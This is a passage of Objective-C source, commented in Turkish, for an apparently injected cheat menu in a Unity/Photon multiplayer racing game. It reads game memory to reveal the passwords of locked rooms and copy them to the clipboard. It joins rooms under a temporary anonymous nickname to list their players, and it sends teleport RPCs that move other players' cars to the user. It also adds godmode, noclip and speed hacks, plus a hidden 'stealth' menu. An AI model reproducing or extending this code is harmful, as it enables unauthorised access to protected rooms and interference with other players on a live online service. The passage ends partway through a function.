// ===== ODAYA GOZ AT: isimsiz anlik gir, oyuncularu oku, cik, ismi geri yukle =====
- (void)peekRoom {
    if (!g_roomLineType || !g_mFindObjectsPlural || !i_runtime_invoke || !pn_joinRoom) { FLog(@"Goz at hazir degil (oda listesine gir)"); return; }
    @try {
        void* a[1]; a[0] = g_roomLineType;
        void* arr = i_runtime_invoke(g_mFindObjectsPlural, NULL, a, NULL);
        if (!ptrOk(arr)) { FLog(@"Oda listesi yok"); return; }
        int cnt = (int)(*(uintptr_t*)((uintptr_t)arr + 0x18));
        if (cnt < 0 || cnt > 128) { FLog(@"Oda sayisi anormal"); return; }
        void** lines = (void**)((uintptr_t)arr + 0x20);
        NSMutableArray *rooms = [NSMutableArray array];   // @[gorunenAd, gercekAd]
        for (int i = 0; i < cnt; i++) {
            void* ln = lines[i]; if (!unityAlive(ln)) continue;
            void* rinfo = *(void**)((uintptr_t)ln + 0x58);
            NSString *real = (ptrOk(rinfo) && rinfo_getName) ? readStr(rinfo_getName(rinfo)) : @"";
            if (real.length == 0) continue;
            NSString *disp = [real stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceAndNewlineCharacterSet]];
            if (disp.length == 0) disp = [NSString stringWithFormat:@"Oda %d", i+1];
            [rooms addObject:@[disp, real]];
        }
        if (rooms.count == 0) { FLog(@"Oda bulunamadi"); return; }
        UIAlertController *ac = [UIAlertController alertControllerWithTitle:@"\U0001F441 Odaya Goz At"
            message:@"Sec: isimsiz anlik girer, oyuncularu gosterir, cikar" preferredStyle:UIAlertControllerStyleAlert];
        for (NSArray *r in rooms) {
            NSString *real = r[1];
            [ac addAction:[UIAlertAction actionWithTitle:r[0] style:UIAlertActionStyleDefault handler:^(UIAlertAction *a2){ [self doPeek:real]; }]];
        }
        [ac addAction:[UIAlertAction actionWithTitle:@"Iptal" style:UIAlertActionStyleCancel handler:nil]];
        [self present:ac];
    } @catch (...) { FLog(@"Goz at hatasi"); }
}
- (void)doPeek:(NSString*)roomName {
    @try {
        NSString *savedNick = (pn_getNickName) ? readStr(pn_getNickName()) : nil;   // ismi kaydet
        if (pn_setNickName) { void* inv = mkStr(@"isimsiz"); if (inv) pn_setNickName(inv); }   // "isimsiz" yaz (bos calismiyor)
        void* ns = mkStr(roomName); if (!ns) { FLog(@"Isim olusmadi"); return; }
        pn_joinRoom(ns, NULL);   // odaya katil
        FLog(@"Odaya goz atiliyor...");
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1.4 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
            @try {
                NSMutableString *list = [NSMutableString string]; int n = 0;
                if (pn_getPlayerList) {
                    void* pa = pn_getPlayerList();
                    if (ptrOk(pa)) {
                        int c = (int)(*(uintptr_t*)((uintptr_t)pa + 0x18));
                        if (c > 0 && c <= 64) {
                            void** ps = (void**)((uintptr_t)pa + 0x20);
                            for (int i = 0; i < c; i++) {
                                void* p = ps[i]; if (!ptrOk(p)) continue;
                                NSString *nick = (ply_getNickName) ? readStr(ply_getNickName(p)) : @"";
                                if (nick.length == 0) nick = @"(isimsiz)";
                                [list appendFormat:@"• %@\n", nick]; n++;
                            }
                        }
                    }
                }
                if (pn_leaveRoom) pn_leaveRoom(false);   // PhotonNetwork.LeaveRoom (guvenilir cikis)
                if (lobbyGetInst && lobby_leaveRoom) { void* lob = lobbyGetInst(); if (lob) lobby_leaveRoom(lob); }   // yedek cikis
                if (pn_setNickName && savedNick.length) { void* rs = mkStr(savedNick); if (rs) pn_setNickName(rs); }   // ismi geri yukle
                UIAlertController *res = [UIAlertController alertControllerWithTitle:@"\U0001F441 Odadaki Oyuncular"
                    message:(n>0 ? list : @"Oyuncu okunamadi (oda dolu/kapali/sifreli olabilir)") preferredStyle:UIAlertControllerStyleAlert];
                [res addAction:[UIAlertAction actionWithTitle:@"Panoya Kopyala" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){ [UIPasteboard generalPasteboard].string = list; }]];
                [res addAction:[UIAlertAction actionWithTitle:@"Kapat" style:UIAlertActionStyleCancel handler:nil]];
                [self present:res];
                FLog([NSString stringWithFormat:@"Goz at: %d oyuncu", n]);
            } @catch (...) { FLog(@"Goz at okuma hatasi"); }
        });
    } @catch (...) { FLog(@"Goz at hatasi"); }
}

- (void)showRoomPasswords {
    if (!g_roomLineType || !g_mFindObjectsPlural || !i_runtime_invoke) { FLog(@"Sifre kirici hazir degil (oda listesine gir)"); return; }
    @try {
        void* a[1]; a[0] = g_roomLineType;
        void* arr = i_runtime_invoke(g_mFindObjectsPlural, NULL, a, NULL);
        if (!ptrOk(arr)) { FLog(@"Oda listesi bulunamadi"); return; }
        int cnt = (int)(*(uintptr_t*)((uintptr_t)arr + 0x18));
        if (cnt < 0 || cnt > 128) { FLog(@"Oda sayisi anormal"); return; }
        void** lines = (void**)((uintptr_t)arr + 0x20);
        UIAlertController *ac = [UIAlertController alertControllerWithTitle:@"\U0001F513 Oda Sifreleri"
                                                                   message:@"Sifreli odalarin sifresi:" preferredStyle:UIAlertControllerStyleAlert];
        NSMutableString *list = [NSMutableString string];
        int shown = 0;
        for (int i = 0; i < cnt; i++) {
            void* ln = lines[i]; if (!unityAlive(ln)) continue;
            NSString *pw = readStr(*(void**)((uintptr_t)ln + 0x50));   // password
            NSString *nm = @"?";
            void* rinfo = *(void**)((uintptr_t)ln + 0x58);
            if (ptrOk(rinfo) && rinfo_getName) nm = readStr(rinfo_getName(rinfo));
            if (pw.length > 0) { [list appendFormat:@"\U0001F512 %@\n     sifre: %@\n\n", nm, pw]; shown++; }
        }
        ac.message = shown ? list : @"Sifreli oda yok (ya da liste bos).";
        [ac addAction:[UIAlertAction actionWithTitle:@"Panoya Kopyala" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){
            [UIPasteboard generalPasteboard].string = list; FLog(@"Sifreler panoya kopyalandi");
        }]];
        [ac addAction:[UIAlertAction actionWithTitle:@"Kapat" style:UIAlertActionStyleCancel handler:nil]];
        [self present:ac];
        FLog([NSString stringWithFormat:@"%d sifreli oda bulundu", shown]);
    } @catch (...) { FLog(@"Sifre okuma hatasi"); }
}

- (void)teleportToPlayer {
    if (!unityAlive(g_rb)) { FLog(@"Once arabana bin"); return; }
    @try {
        Vec3 myPos = {0,0,0}; rbGetPosIl(g_rb, &myPos);
        NSMutableArray *rows = [NSMutableArray array];   // @[isim, mesafe, x,y,z]

        // ONCELIK: PhotonView ile ISIMLI liste. Owner(Player*)@0x80 -> nickname.
        // Field-read (metod cagirmaz) -> cokme YOK. IsMine@0x68 ile kendi araban elenir.
        if (g_photonViewType && g_isMineOff > 0 && g_pvOwnerOff > 0 && g_mFindObjectsPlural && i_runtime_invoke) {
            void* a[1]; a[0] = g_photonViewType;
            void* arr = i_runtime_invoke(g_mFindObjectsPlural, NULL, a, NULL);
            if (ptrOk(arr)) {
                int n = (int)(*(uintptr_t*)((uintptr_t)arr + 0x18));
                if (n > 0 && n <= 512) {
                    void** pvs = (void**)((uintptr_t)arr + 0x20);
                    NSMutableArray *seen = [NSMutableArray array];   // owner pointer dedupe
                    for (int i = 0; i < n; i++) {
                        void* pv = pvs[i]; if (!unityAlive(pv)) continue;
                        bool mine = *(bool*)((uintptr_t)pv + g_isMineOff);
                        if (mine) continue;                                     // kendi arabam -> atla
                        void* owner = *(void**)((uintptr_t)pv + g_pvOwnerOff);   // Player*
                        if (!ptrOk(owner)) continue;                            // sahipsiz obje -> atla
                        NSValue *ov = [NSValue valueWithPointer:owner];
                        if ([seen containsObject:ov]) continue;                 // ayni oyuncu tekrari
                        Vec3 p; if (!few1n_objPos(pv, &p)) continue;
                        [seen addObject:ov];
                        NSString *nm = (ply_getNickName) ? readStr(ply_getNickName(owner)) : nil;
                        if (nm.length == 0) nm = @"(isimsiz)";
                        float dx=p.x-myPos.x, dy=p.y-myPos.y, dz=p.z-myPos.z;
                        [rows addObject:@[nm, @(sqrtf(dx*dx+dy*dy+dz*dz)), @(p.x), @(p.y), @(p.z)]];
                    }
                }
            }
        }
        // YEDEK: PhotonView cozulemezse eski Rigidbody yontemi (isimsiz).
        if (rows.count == 0) {
            void* rbs[48]; int n = few1n_collectCars(rbs, 48);
            for (int i = 0; i < n; i++) {
                void* rb = rbs[i]; if (!unityAlive(rb)) continue;
                Vec3 p; rbGetPosIl(rb, &p);
                float dx=p.x-myPos.x, dy=p.y-myPos.y, dz=p.z-myPos.z;
                [rows addObject:@[[NSString stringWithFormat:@"Arac %d", i+1], @(sqrtf(dx*dx+dy*dy+dz*dz)), @(p.x), @(p.y), @(p.z)]];
            }
        }

        if (rows.count == 0) { FLog(@"Baska oyuncu yok (yarista dene)"); return; }
        [rows sortUsingComparator:^NSComparisonResult(NSArray *a, NSArray *b){ return [a[1] compare:b[1]]; }];
        UIAlertController *ac = [UIAlertController alertControllerWithTitle:@"\U0001F680 Oyuncuya Isinlan"
                                                                   message:[NSString stringWithFormat:@"%lu oyuncu - yanina isinlan", (unsigned long)rows.count] preferredStyle:UIAlertControllerStyleAlert];
        for (NSArray *r in rows) {
            NSString *nm = r[0];
            float dist = [r[1] floatValue], x = [r[2] floatValue], yy = [r[3] floatValue], z = [r[4] floatValue];
            [ac addAction:[UIAlertAction actionWithTitle:[NSString stringWithFormat:@"\U0001F697 %@  (%.0fm)", nm, dist]
                style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){
                if (!unityAlive(g_rb)) return;
                Vec3 t = { x, yy + 2.0f, z - 4.0f };   // hafif ustunde ve arkasinda (icine girme)
                rbSetPosIl(g_rb, &t);
                Vec3 zero = {0,0,0}; rbSetVelIl(g_rb, &zero);
                FLog([NSString stringWithFormat:@"%@ yanina isinlanildi (%.0fm)", nm, dist]);
            }]];
        }
        [ac addAction:[UIAlertAction actionWithTitle:@"Iptal" style:UIAlertActionStyleCancel handler:nil]];
        [self present:ac];
    } @catch (...) { FLog(@"Isinlanma hatasi"); }
}

- (void)bringPlayerToMe {
    if (!unityAlive(g_rb)) { FLog(@"Once arabana bin"); return; }
    @try {
        Vec3 myPos = {0,0,0}; rbGetPosIl(g_rb, &myPos);
        NSMutableArray *rows = [NSMutableArray array];   // @[nm, dist, pvPtr]

        if (g_photonViewType && g_isMineOff > 0 && g_pvOwnerOff > 0 && g_mFindObjectsPlural && i_runtime_invoke) {
            void* a[1]; a[0] = g_photonViewType;
            void* arr = i_runtime_invoke(g_mFindObjectsPlural, NULL, a, NULL);
            if (ptrOk(arr)) {
                int n = (int)(*(uintptr_t*)((uintptr_t)arr + 0x18));
                if (n > 0 && n <= 512) {
                    void** pvs = (void**)((uintptr_t)arr + 0x20);
                    NSMutableArray *seen = [NSMutableArray array];
                    for (int i = 0; i < n; i++) {
                        void* pv = pvs[i]; if (!unityAlive(pv)) continue;
                        bool mine = *(bool*)((uintptr_t)pv + g_isMineOff);
                        if (mine) continue;
                        void* owner = *(void**)((uintptr_t)pv + g_pvOwnerOff);
                        if (!ptrOk(owner)) continue;
                        NSValue *ov = [NSValue valueWithPointer:owner];
                        if ([seen containsObject:ov]) continue;
                        Vec3 p; if (!few1n_objPos(pv, &p)) continue;
                        [seen addObject:ov];
                        NSString *nm = (ply_getNickName) ? readStr(ply_getNickName(owner)) : nil;
                        if (nm.length == 0) nm = @"(isimsiz)";
                        float dx=p.x-myPos.x, dy=p.y-myPos.y, dz=p.z-myPos.z;
                        float dist = sqrtf(dx*dx+dy*dy+dz*dz);
                        [rows addObject:@[nm, @(dist), [NSValue valueWithPointer:pv]]];
                    }
                }
            }
        }

        if (rows.count == 0) { FLog(@"Baska oyuncu yok (yarista/odada dene)"); return; }
        [rows sortUsingComparator:^NSComparisonResult(NSArray *a, NSArray *b){ return [a[1] compare:b[1]]; }];

        UIAlertController *ac = [UIAlertController alertControllerWithTitle:@"\U0001F9F2 Oyuncuyu Yanima Cek"
                                                                   message:[NSString stringWithFormat:@"%lu oyuncu - yanina isinlamak istedigini sec", (unsigned long)rows.count] preferredStyle:UIAlertControllerStyleAlert];
        for (NSArray *r in rows) {
            NSString *nm = r[0];
            float dist = [r[1] floatValue];
            void* pv = [r[2] pointerValue];
            [ac addAction:[UIAlertAction actionWithTitle:[NSString stringWithFormat:@"\U0001F697 %@ (%.0fm)", nm, dist]
                style:UIAlertActionStyleDefault handler:^(UIAlertAction *act){
                if (!unityAlive(g_rb)) return;
                Vec3 curMyPos = {0,0,0}; rbGetPosIl(g_rb, &curMyPos);
                Vec3 targetPos = { curMyPos.x + 3.0f, curMyPos.y + 0.5f, curMyPos.z + 3.0f };
                Quaternion rotZero = { 0.0f, 0.0f, 0.0f, 1.0f };

                // 1) Yerel Rigidbody konumunu ayarla
                void* targetRb = NULL;
                if (ptrOk(pv) && g_rbTypeObj && g_mGetCompInParent && i_runtime_invoke) {
                    void* args[2]; args[0] = g_rbTypeObj; bool inc = true; args[1] = &inc;
                    targetRb = i_runtime_invoke(g_mGetCompInParent, pv, args, NULL);
                }
                if (ptrOk(targetRb)) {
                    rbSetPosIl(targetRb, &targetPos);
                    Vec3 zero = {0,0,0}; rbSetVelIl(targetRb, &zero);
                }

                // 2) RPC Teleport cagrilari
                int rpcCount = 0;
                if (g_carPhotonSyncTypeObj && g_mGetCompInParent && i_runtime_invoke && cps_TeleportCar_RPC) {
                    void* args[2]; args[0] = g_carPhotonSyncTypeObj; bool inc = true; args[1] = &inc;
                    void* cps = i_runtime_invoke(g_mGetCompInParent, pv, args, NULL);
                    if (ptrOk(cps)) {
                        cps_TeleportCar_RPC(cps, targetPos, rotZero, NULL);
                        rpcCount++;
                    }
                }
                if (hrph_TeleportPlayerRPC) {
                    void* hrph = NULL;
                    if (g_hrPhotonHandlerTypeObj && g_mFindObjectOfType && i_runtime_invoke) {
                        void* args[1]; args[0] = g_hrPhotonHandlerTypeObj;
                        hrph = i_runtime_invoke(g_mFindObjectOfType, NULL, args, NULL);
                    }
                    if (ptrOk(hrph)) {
                        hrph_TeleportPlayerRPC(hrph, targetPos, NULL);
                        rpcCount++;
                    }
                }
                FLog([NSString stringWithFormat:@"'%@' yanina isinlandirildi! (%d RPC atildi)", nm, rpcCount]);
            }]];
        }
        [ac addAction:[UIAlertAction actionWithTitle:@"Iptal" style:UIAlertActionStyleCancel handler:nil]];
        [self present:ac];
    } @catch (...) { FLog(@"Isinlama hatasi"); }
}

- (void)tick {
    enforceScale();
    few1n_findCar();   // sadece arama (throttle'li); uygulama frameTick'te
    few1n_forcePlate(); // ozel plaka acikken il2cpp ile zorla (hook olu)
    // v92: BALATA SICAK TUT + HASAR YOK frame update GERI ALINDI — dokunmatik/input bug sebep olabilir
    // Toggle'lar UI'da duruyor ama etkisiz (placeholder). Bug root cause'u bulunca gercek fix gelecek.
    // arac rengi acikken materyalleri BIR KEZ al (tekrar fetch instance sizdirir/coker)
    if (isCarColorEnabled && unityAlive(g_rb) && g_carMatCount == 0) few1n_refreshCarMats();
    // OTOMATIK SÜREKLİ ARAMA: araba tipi veya araba yoksa periyodik yeniden tara
    static int retryTick = 0;
    if (!g_carDriveTypeObj || !unityAlive(g_rb)) {
        if (++retryTick >= 5) {
            retryTick = 0;
            few1n_initIl2cpp();
            few1n_findCar();
        }
    }
    // ~6 sn'de bir tek satir teshis (log spam azaltildi)
    static int tc = 0;
    if (++tc >= 20) {
        tc = 0;
        float ts = g_il2cppReady ? getTimeScaleVal() : -1.0f;
        FLog([NSString stringWithFormat:@"[DIAG] ARAMA=%ld carDrive=%@ rb=%@ TS=%.2f tip=%@ il2cpp=%@",
              fFind, g_carDrive ? @"VAR" : @"YOK", g_rb ? @"VAR" : @"YOK", ts,
              g_carDriveTypeObj ? @"VAR" : @"YOK", g_il2cppReady ? @"OK" : @"YOK"]);
    }
}

- (void)toggle {
    // Stealth Mode: triple-tap ile gizli acma
    NSDate *now = [NSDate date];
    if (stealthLastTap && [now timeIntervalSinceDate:stealthLastTap] < 0.5) {
        stealthTapCount++;
    } else {
        stealthTapCount = 1;
    }
    stealthLastTap = now;
    if (stealthTapCount >= 3) {
        isStealthMode = !isStealthMode;
        stealthTapCount = 0;
        FLog(isStealthMode ? @"STEALTH MODE ACIK - Menu gizli" : @"STEalth MODE KAPALI - Menu gorunur");
        self.fab.hidden = isStealthMode;
        if (!isStealthMode) {
            // Stealth kapandiginda FAB'i goster
            self.fab.hidden = NO;
            self.fab.alpha = 0;
            [UIView animateWithDuration:0.3 animations:^{ self.fab.alpha = 1; }];
        }
        // Panelleri gizle/ac
        self.panel.hidden = YES;
        return;
    }
    if (isStealthMode) {
        // Stealth moddayken normal toggle calismaz, sadece triple-tap ile acilir
        return;
    }
    if (self.panel.hidden) {
        [self refreshUI];
        self.panel.hidden = NO;
        [UIView animateWithDuration:0.35 delay:0 usingSpringWithDamping:0.8 initialSpringVelocity:0.5 options:0 animations:^{
            self.panel.alpha = 1; self.panel.transform = CGAffineTransformIdentity;
        } completion:nil];
    } else {
        [UIView animateWithDuration:0.2 animations:^{
            self.panel.alpha = 0; self.panel.transform = CGAffineTransformMakeScale(0.9,0.9);
        } completion:^(BOOL f){ self.panel.hidden = YES; }];
    }
}

- (void)drag:(UIPanGestureRecognizer*)g {
    UIView *v = g.view; if (!v) return;
    CGPoint t = [g translationInView:v.superview];
    v.center = CGPointMake(v.center.x + t.x, v.center.y + t.y);
    [g setTranslation:CGPointZero inView:v.superview];
}

- (void)speedTap:(UIButton*)s {
    speedMode = (int)s.tag;
    saveInt(@"speedMode", speedMode);
    [self refreshUI];
    enforceScale();
}
- (void)speedSliderChanged:(UISlider*)sl {
    // Slider'ı 0.1 adım precision'a snap et
    float v = roundf(sl.value * 10.0f) / 10.0f;
    if (v < 0.1f) v = 0.1f;
    if (v > 10.0f) v = 10.0f;
    speedMult = v;
    sl.value = v;
    // uyumluluk: eski speedMode alanini yaklasik degere set et
    speedMode = (v >= 4.5f) ? 5 : (v >= 2.5f) ? 3 : (v >= 1.5f) ? 2 : 1;
    saveInt(@"speedMult10", (int)(v*10));
    UIView *sr = sl.superview;
    if (sr) { UILabel *lb = (UILabel*)[sr viewWithTag:991]; if (lb) lb.text = [NSString stringWithFormat:@"Hiz Carpani: %.1fx", v]; }
    enforceScale();
}
- (void)speedReset {
    speedMult = 1.0f; speedMode = 1;
    saveInt(@"speedMult10", 10);
    saveInt(@"speedMode", 1);
    [self refreshUI];
    enforceScale();
    // slider'i de guncelle
    for (UIView *sub in self.contentView.subviews) {
        UISlider *sl = (UISlider*)[sub viewWithTag:992];
        if ([sl isKindOfClass:[UISlider class]]) { sl.value = 1.0f;
            UILabel *lb = (UILabel*)[sub viewWithTag:991]; if (lb) lb.text = @"Hiz Carpani: 1.0x"; break; }
    }
}

- (void)tapDrift   {
    isDriftEnabled = !isDriftEnabled; saveBool(@"drift", isDriftEnabled);
    if (isDriftEnabled) {
        @try { few1n_findCar(); } @catch (...) {}
        FLog(unityAlive(g_rb) ? @"🧊 Drift ACIK - arac hazir, y hizi kesiliyor" : @"🧊 Drift acildi ama arac YOK - spawn olunca calisir");
    } else FLog(@"🧊 Drift kapali");
    [self refreshUI];
}
- (void)tapCruise  { isCruiseEnabled = !isCruiseEnabled; saveBool(@"cruise", isCruiseEnabled); FLog(isCruiseEnabled ? @"Cruise Control ACIK" : @"Cruise Control KAPALI"); [self refreshUI]; }
- (void)editCruiseSpeed {
    UIAlertController *ac = [UIAlertController alertControllerWithTitle:@"🚗 Sabit Hiz (Cruise Control)"
                                                               message:@"Hedef hizi km/h cinsinden secin:" preferredStyle:UIAlertControllerStyleAlert];
    NSArray *speeds = @[@120, @160, @200, @250, @300, @350];
    for (NSNumber *s in speeds) {
        int v = [s intValue];
        [ac addAction:[UIAlertAction actionWithTitle:[NSString stringWithFormat:@"%d km/h", v] style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){
            cruiseSpeedKmh = (float)v; saveFloat(@"cruiseSpeed", cruiseSpeedKmh);
            FLog([NSString stringWithFormat:@"Sabit hiz ayarlandi: %d km/h", v]);
            [self refreshUI];
        }]];
    }
    [ac addAction:[UIAlertAction actionWithTitle:@"Iptal" style:UIAlertActionStyleCancel handler:nil]];
    [self present:ac];
}
- (void)tapAntiGrav  { isAntiGrav = !isAntiGrav; saveBool(@"antigrav", isAntiGrav); [self refreshUI]; }
- (void)tapNoClip    { isNoClip = !isNoClip; saveBool(@"noclip", isNoClip); FLog(isNoClip ? @"No-Clip ACIK - araclardan gec (uc ile birlestir)" : @"No-Clip KAPALI"); [self refreshUI]; }
- (void)tapGodmode   {
    isGodmode = !isGodmode; saveBool(@"godmode", isGodmode);
    if(!isGodmode) g_myPlayerHandler = NULL;
    if (isGodmode) {
        @try { few1n_findCar(); } @catch (...) {}
        NSMutableString *d = [NSMutableString stringWithString:@"🛡 GODMODE - "];
        if (!unityAlive(g_rb))               [d appendString:@"araç YOK "];
        if (!g_myPlayerHandler)              [d appendString:@"PlayerHandler bulunmadı "];
        if (unityAlive(g_rb) && g_myPlayerHandler)
            [d appendString:@"HAZIR (canCrash=false zorlanacak her frame)"];
        else [d appendString:@"(arac spawn olunca aktif olur)"];
        FLog(d);
    } else FLog(@"Godmode kapali");
    [self refreshUI];
}
- (void)tapSelektor  {
    isSelektor = !isSelektor; saveBool(@"selektor", isSelektor);
    if(!isSelektor) g_myLights = NULL;
    if (isSelektor) {
        NSMutableString *d = [NSMutableString stringWithString:@"💡 Selektor AKTIF - "];
        if (!g_rccpLightsType)    [d appendString:@"RCCP_Lights tipi YOK "];
        if (!g_mFindObjectsPlural)[d appendString:@"FindObjects YOK "];
        if (!unityAlive(g_rb))    [d appendString:@"g_rb (arac) YOK "];
        if (g_rccpLightsType && g_mFindObjectsPlural && unityAlive(g_rb))
            [d appendString:@"HAZIR (arac 100m icindeyse cakmaya baslar)"];
        FLog(d);
    } else FLog(@"💡 Selektor kapali");
    [self refreshUI];
}
- (void)editSelektorSpeed {
    UIAlertController *ac = [UIAlertController alertControllerWithTitle:@"\U0001F4A1 Selektor Hizi"
        message:@"Cakma hizini sec (kucuk = hizli)" preferredStyle:UIAlertControllerStyleAlert];
    NSArray *opts = @[@[@"⚡ Cok Hizli (strobe)", @1], @[@"\U0001F525 Hizli", @2], @[@"➡️ Orta", @4], @[@"\U0001F422 Yavas", @8], @[@"\U0001F40C Cok Yavas", @14]];
    for (NSArray *o in opts) {
        int r = [o[1] intValue];
        [ac addAction:[UIAlertAction actionWithTitle:o[0] style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){
            g_selFlashRate = r; saveInt(@"selRate", r); FLog([NSString stringWithFormat:@"Selektor hizi ayarlandi: %d frame", r]); [self refreshUI];
        }]];
    }
    [ac addAction:[UIAlertAction actionWithTitle:@"Iptal" style:UIAlertActionStyleCancel handler:nil]];
    [self present:ac];
}
- (void)tapCarSize   { isCarSizeEnabled = !isCarSizeEnabled; saveBool(@"carsize", isCarSizeEnabled); [self refreshUI]; }
- (void)editCarSize {
    UIAlertController *ac = [UIAlertController alertControllerWithTitle:@"\U0001F4CF Arac Boyutu"
        message:@"Kat (0.3 = minik, 1 = normal, 3 = dev)" preferredStyle:UIAlertControllerStyleAlert];
    [ac addTextFieldWithConfigurationHandler:^(UITextField *tf){ tf.keyboardType = UIKeyboardTypeDecimalPad; tf.text = [NSString stringWithFormat:@"%.1f", carSizeVal]; }];
    [ac addAction:[UIAlertAction actionWithTitle:@"Uygula" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){
        float v = [ac.textFields.firstObject.text floatValue];
        if (v >= 0.3f && v <= 5.0f) { carSizeVal = v; saveFloat(@"carSize", v); isCarSizeEnabled = true; saveBool(@"carsize", true); }
        [self refreshUI];
    }]];
    [ac addAction:[UIAlertAction actionWithTitle:@"Iptal" style:UIAlertActionStyleCancel handler:nil]];
    [self present:ac];
}
- (void)tapCarColor  { isCarColorEnabled = !isCarColorEnabled; saveBool(@"carcolor", isCarColorEnabled); if (isCarColorEnabled) few1n_refreshCarMats(); [self refreshUI]; }
- (void)tapCarColorRainbow { carColorRainbow = !carColorRainbow; saveBool(@"carrainbow", carColorRainbow); [self refreshUI]; }
- (void)pickCarColor {
    UIAlertController *ac = [UIAlertController alertControllerWithTitle:@"\U0001F3A8 Sabit Renk" message:@"Renk sec (RGB dongu kapaliyken)" preferredStyle:UIAlertControllerStyleActionSheet];
    void (^add)(NSString*, float, float, float) = ^(NSString *nm, float r, float g, float b){
        [ac addAction:[UIAlertAction actionWithTitle:nm style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){
            g_carColor = (Color4){r,g,b,1.0f}; carColorRainbow = false;
            saveBool(@"carrainbow", false); saveFloat(@"carR", r); saveFloat(@"carG", g); saveFloat(@"carB", b);
            isCarColorEnabled = true; saveBool(@"carcolor", true); few1n_refreshCarMats(); [self refreshUI];
        }]];
    };
    add(@"\U0001F534 Kirmizi", 1,0,0); add(@"\U0001F7E0 Turuncu", 1,0.5f,0); add(@"\U0001F7E1 Sari", 1,1,0);
    add(@"\U0001F7E2 Yesil", 0,1,0); add(@"\U0001F535 Mavi", 0,0.4f,1); add(@"\U0001F7E3 Mor", 0.6f,0,1);
    add(@"⚫ Siyah", 0.02f,0.02f,0.02f); add(@"⚪ Beyaz", 1,1,1);
    [ac addAction:[UIAlertAction actionWithTitle:@"Iptal" style:UIAlertActionStyleCancel handler:nil]];
    if (ac.popoverPresentationController) { ac.popoverPresentationController.sourceView = self.panel; ac.popoverPresentationController.sourceRect = CGRectMake(self.panel.bounds.size.width/2, self.panel.bounds.size.height/2, 1, 1); }
    [self present:ac];
}
- (void)tapFly {
    isFlyEnabled = !isFlyEnabled;
    saveBool(@"fly", isFlyEnabled);
    if (isFlyEnabled) {
        isFlyPadShown = true;
        saveBool(@"flypad", true);
        [self buildFlyPad];
        FLog(@"✈️ Uçuş Modu AÇIK - Ekran D-pad kumandası gösterildi!");
    } else {
        isFlyPadShown = false;
        saveBool(@"flypad", false);
        if (self.flyPad) { [self.flyPad removeFromSuperview]; self.flyPad = nil; }
        g_dpFwd = g_dpBack = g_dpLeft = g_dpRight = g_dpUp = g_dpDown = false;
        FLog(@"✈️ Uçuş Modu KAPALI");
    }
    [self refreshUI];
}

- (void)tapFlyAuto {
    flyAutoThrust = !flyAutoThrust;
    saveBool(@"flyauto", flyAutoThrust);
    FLog(flyAutoThrust ? @"Ucusta Otomatik Gaz ACIK - sadece direksiyonla don" : @"Otomatik Gaz KAPALI");
    [self refreshUI];
}

// ===== UCUS D-PAD: ekran kumandasi =====
- (void)dpSet:(int)tag on:(BOOL)on {
    switch (tag) {
        case 1: g_dpFwd = on;  break;
        case 2: g_dpBack = on; break;
        case 3: g_dpLeft = on; break;
        case 4: g_dpRight = on; break;
        case 5: g_dpUp = on;   break;
        case 6: g_dpDown = on; break;
    }
}
- (void)dpDown:(UIButton*)b { [self dpSet:(int)b.tag on:YES]; }
- (void)dpUp:(UIButton*)b   { [self dpSet:(int)b.tag on:NO]; }
- (void)dragPad:(UIPanGestureRecognizer*)g {
    UIView *v = g.view; CGPoint t = [g translationInView:v.superview];
    v.center = CGPointMake(v.center.x + t.x, v.center.y + t.y);
    [g setTranslation:CGPointZero inView:v.superview];
}

- (void)buildFlyPad {
    UIWindow *w = getKeyWindow();
    if (!w && self.fab) w = self.fab.window;
    if (!w && self.panel) w = self.panel.window;
    if (!w) w = [UIApplication sharedApplication].keyWindow;
    if (!w) {
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(0.5 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
            [self buildFlyPad];
        });
        return;
    }

    if (self.flyPad) { [self.flyPad removeFromSuperview]; self.flyPad = nil; }

    CGFloat sz = 214;
    UIView *pad = [[UIView alloc] initWithFrame:CGRectMake(w.bounds.size.width - sz - 20, w.bounds.size.height - sz - 70, sz, sz)];
    pad.backgroundColor = [UIColor colorWithRed:0.04 green:0.08 blue:0.16 alpha:0.85];
    pad.layer.cornerRadius = 20;
    pad.layer.borderWidth = 1.5;
    pad.layer.borderColor = [UIColor colorWithRed:0.10 green:0.65 blue:0.95 alpha:0.80].CGColor;
    pad.layer.shadowColor = [UIColor colorWithRed:0.0 green:0.6 blue:1.0 alpha:0.6].CGColor;
    pad.layer.shadowRadius = 12;
    pad.layer.shadowOpacity = 0.8;
    pad.layer.zPosition = 99999;
    self.flyPad = pad;

    [pad addGestureRecognizer:[[UIPanGestureRecognizer alloc] initWithTarget:self action:@selector(dragPad:)]];

    CGFloat g = 6, cell = (sz - 4*g) / 3.0;
    // @[baslik, tag, col, row]
    NSArray *specs = @[
        @[@"⬆", @5, @1, @0],   // yukari
        @[@"◀", @3, @0, @1],   // sol don
        @[@"🚀", @1, @1, @1],  // ileri
        @[@"▶", @4, @2, @1],   // sag don
        @[@"⬇", @6, @1, @2],   // asagi
        @[@"⤵", @2, @2, @2],   // geri
    ];
    for (NSArray *sp in specs) {
        int tg = [sp[1] intValue], col = [sp[2] intValue], row = [sp[3] intValue];
        UIButton *btn = [UIButton buttonWithType:UIButtonTypeCustom];
        btn.frame = CGRectMake(g + col*(cell+g), g + row*(cell+g), cell, cell);
        btn.backgroundColor = [UIColor colorWithRed:0.0 green:0.55 blue:0.90 alpha:0.90];
        btn.layer.cornerRadius = 12;
        [btn setTitle:sp[0] forState:UIControlStateNormal];
        [btn setTitleColor:[UIColor whiteColor] forState:UIControlStateNormal];
        btn.titleLabel.font = [UIFont systemFontOfSize:22 weight:UIFontWeightBlack];
        btn.tag = tg;
        [btn addTarget:self action:@selector(dpDown:) forControlEvents:UIControlEventTouchDown];
        [btn addTarget:self action:@selector(dpUp:) forControlEvents:UIControlEventTouchUpInside|UIControlEventTouchUpOutside|UIControlEventTouchCancel];
        [pad addSubview:btn];
    }

    [w addSubview:pad];
